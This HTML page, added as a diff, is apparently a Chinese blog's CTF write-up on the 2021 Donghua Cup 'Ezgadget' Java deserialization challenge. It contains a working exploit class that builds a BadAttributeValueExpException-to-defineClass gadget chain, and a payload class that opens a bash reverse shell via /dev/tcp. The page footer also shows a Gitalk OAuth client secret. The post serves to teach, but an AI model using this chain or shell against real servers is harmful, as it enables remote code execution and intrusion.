@@ -1,0 +1,421 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>2021东华杯Ezgadget复现 | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="2021东华杯Ezgadget复现 | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="前言
+东华杯去年打进决赛了，但那时候基本上我都是打misc，也不懂Java，最近学了一些Java的知识，就来复现一下这个题目，算是炒冷饭了，话不多说，进入正题。
+复现过程
+题目给了一个jar包(下载地址放在文章末)，使用jd-gui反编译看..." />
+    <meta name="keywords" content="Java,反序列化" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              2021东华杯Ezgadget复现
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-03-29
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/Jb2lgvYBPU/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="前言">前言</h2>
+<p>东华杯去年打进决赛了，但那时候基本上我都是打misc，也不懂Java，最近学了一些Java的知识，就来复现一下这个题目，算是炒冷饭了，话不多说，进入正题。</p>
+<h2 id="复现过程">复现过程</h2>
+<p>题目给了一个jar包(下载地址放在文章末)，使用<code>jd-gui</code>反编译看一下源码。</p>
+<p><strong>IndexController</strong>: 网站首页，有一个<code>readobject</code>路由，接收一个data参数，然后将data的值进行base64解码，然后将其变为一个对象流，读取一个UTF和一个Int，如果满足<code>name.equals(&quot;gadgets&quot;) &amp;&amp; year == 2021</code>即触发反序列化</p>
+<pre><code class="language-java">import com.ezgame.ctf.tools.Tools;
+import java.io.ByteArrayInputStream;
+import java.io.InputStream;
+import java.io.ObjectInputStream;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import org.springframework.stereotype.Controller;
+import org.springframework.ui.Model;
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.ResponseBody;
+
+@Controller
+public class IndexController {
+  @ResponseBody
+  @RequestMapping({&quot;/&quot;})
+  public String index(HttpServletRequest request, HttpServletResponse response) {
+    return &quot;index&quot;;
+  }
+  
+  @ResponseBody
+  @RequestMapping({&quot;/readobject&quot;})
+  public String unser(@RequestParam(name = &quot;data&quot;, required = true) String data, Model model) throws Exception {
+    byte[] b = Tools.base64Decode(data);
+    InputStream inputStream = new ByteArrayInputStream(b);
+    ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
+    String name = objectInputStream.readUTF();
+    int year = objectInputStream.readInt();
+    if (name.equals(&quot;gadgets&quot;) &amp;&amp; year == 2021)
+      objectInputStream.readObject(); 
+    return &quot;welcome bro.&quot;;
+  }
+}
+</code></pre>
+<p><strong>User</strong>: 一个常见的JavaBean</p>
+<pre><code class="language-java">mport java.io.Serializable;
+
+public class User implements Serializable {
+    private String UserName;
+
+    private String PassWord;
+
+    public String getUserName() {
+        return this.UserName;
+    }
+
+    public void setUserName(String userName) {
+        this.UserName = userName;
+    }
+
+    public String getPassWord() {
+        return this.PassWord;
+    }
+
+    public void setPassWord(String passWord) {
+        this.PassWord = passWord;
+    }
+
+    public String toString() {
+        return &quot;User{UserName='&quot; + this.UserName + '\'' + &quot;, PassWord='&quot; + this.PassWord + '\'' + '}';
+    }
+}
+</code></pre>
+<p><strong>Tools</strong>: 定义了Base64的加解密以及序列化和反序列化</p>
+<pre><code class="language-java">import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.util.Base64;
+
+public class Tools {
+    public static byte[] base64Decode(String base64) {
+        Base64.Decoder decoder = Base64.getDecoder();
+        return decoder.decode(base64);
+    }
+
+    public static String base64Encode(byte[] bytes) {
+        Base64.Encoder encoder = Base64.getEncoder();
+        return encoder.encodeToString(bytes);
+    }
+
+    public static byte[] serialize(Object obj) throws Exception {
+        ByteArrayOutputStream btout = new ByteArrayOutputStream();
+        ObjectOutputStream objOut = new ObjectOutputStream(btout);
+        objOut.writeObject(obj);
+        return btout.toByteArray();
+    }
+
+    public static Object deserialize(byte[] serialized) throws Exception {
+        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
+        ObjectInputStream objIn = new ObjectInputStream(btin);
+        return objIn.readObject();
+    }
+}
+</code></pre>
+<p><strong>ToStringBean</strong>: 继承了ClassLoader，为了能调用defineClass，从而动态加载一个类，将这个类实例化从而达到命令执行。这里只要能调用<code>toString</code>就能加载我们传入的恶意字节码，其中ClassByte就是我们要传入的恶意字节码，由于是私有的，所以只能通过反射来进行赋值。</p>
+<pre><code class="language-java">import java.io.Serializable;
+
+public class ToStringBean extends ClassLoader implements Serializable {
+    private byte[] ClassByte;
+
+    public String toString() {
+        com.ezgame.ctf.tools.ToStringBean toStringBean = new com.ezgame.ctf.tools.ToStringBean();
+        Class clazz = toStringBean.defineClass((String)null, this.ClassByte, 0, this.ClassByte.length);
+        Object Obj = null;
+        try {
+            Obj = clazz.newInstance();//类的实例化
+        } catch (InstantiationException e) {
+            e.printStackTrace();
+        } catch (IllegalAccessException e) {
+            e.printStackTrace();
+        }
+        return &quot;enjoy it.&quot;;
+    }
+}
+</code></pre>
+<p>整个过程的一个逻辑就是<code>readobject</code>路由对data参数进行反序列化，而<code>toStringBean</code>类重写了<code>toString</code>方法。然后<code>BadAttributeValueExpException</code>类的readobject方法中调用了<code>val</code>的<code>toString()</code>方法，<code>val</code>可以传入<code>toStringBean</code>，从而在调用<code>BadAttributeValueExpException</code>的<code>readobject</code>的时候调用的<code>toStringBean</code>的<code>toString()</code>方法。</p>
+<p>所以可以从<code>BadAttributeValueExpException.readobject</code> -&gt; <code>toStringBean.toString</code> -&gt; <code>defineClass+newInstance()</code>。</p>
+<h2 id="exp">Exp</h2>
+<pre><code class="language-java">package com.ezgame.ctf;
+import com.ezgame.ctf.tools.ToStringBean;
+import com.ezgame.ctf.tools.Tools;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class Exp {
+    public static void main(String[] args) throws Exception{
+        ToStringBean toStringBean = new ToStringBean();
+        Field classByteField = toStringBean.getClass().getDeclaredField(&quot;ClassByte&quot;);
+        classByteField.setAccessible(true);
+        byte[] bytes = Files.readAllBytes(Paths.get(&quot;D:\\Cc\\IntelliJ IDEA 2021.1\\Ezgadget\\target\\classes\\com\\ezgame\\ctf\\payload.class&quot;));
+        classByteField.set(toStringBean,bytes);//对ToStringBean类中的ClassByte赋值
+
+        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123123);
+        Field valField = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);
+        valField.setAccessible(true);
+        valField.set(badAttributeValueExpException,toStringBean);//对val赋值为toStringBean，从而在调用badAttributeValueExpException的readobject的时候调用的toStringBean的toString()方法
+
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//新建一个字节流
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);//把字节流转为对象流
+        objectOutputStream.writeUTF(&quot;gadgets&quot;);//往UTF中写入gadgets
+        objectOutputStream.writeInt(2021);//往Int中写入2021
+        objectOutputStream.writeObject(badAttributeValueExpException);//调用badAttributeValueExpException.writeObject序列化
+
+        byte[] bytes1 = byteArrayOutputStream.toByteArray();//把字节流导出为字节数组
+        String s = Tools.base64Encode(bytes1);//base64编码
+        System.out.println(s);
+
+    }
+}
+</code></pre>
+<p><strong>恶意字节码</strong></p>
+<pre><code class="language-java">package com.ezgame.ctf;
+
+import java.io.IOException;
+
+public class payload {
+    static {
+        try {
+            Runtime.getRuntime().exec(new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/7777 0&gt;&amp;1&quot;});
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>我把jar包放虚拟机上，把环境跑起来，尝试反弹shell</p>
+<pre><code>java -jar ezgadget.jar
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/29/da2609620ec18.png" alt="1648566574006.png" loading="lazy"></figure>
+<p>因为base64编码出来的payload有+号，而处理的时候会当作空格引发报错，所以要进行url编码</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/29/17e8ecd1f59ae.png" alt="1648566787291.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/29/0c9fd362f1387.png" alt="1648566764073.png" loading="lazy"></figure>
+<p>成功反弹shell，原先在le1a目录，收到了来自桌面的反弹shell</p>
+<hr>
+<p>题目附件：<a href="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/29/e14568b06e182.jar">点击下载</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B">复现过程</a></li>
+<li><a href="#exp">Exp</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/Shiro无依赖链——Commons Beanutils/">
+              <h3 class="post-title">
+                Shiro无依赖链—Commons Beanutils
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
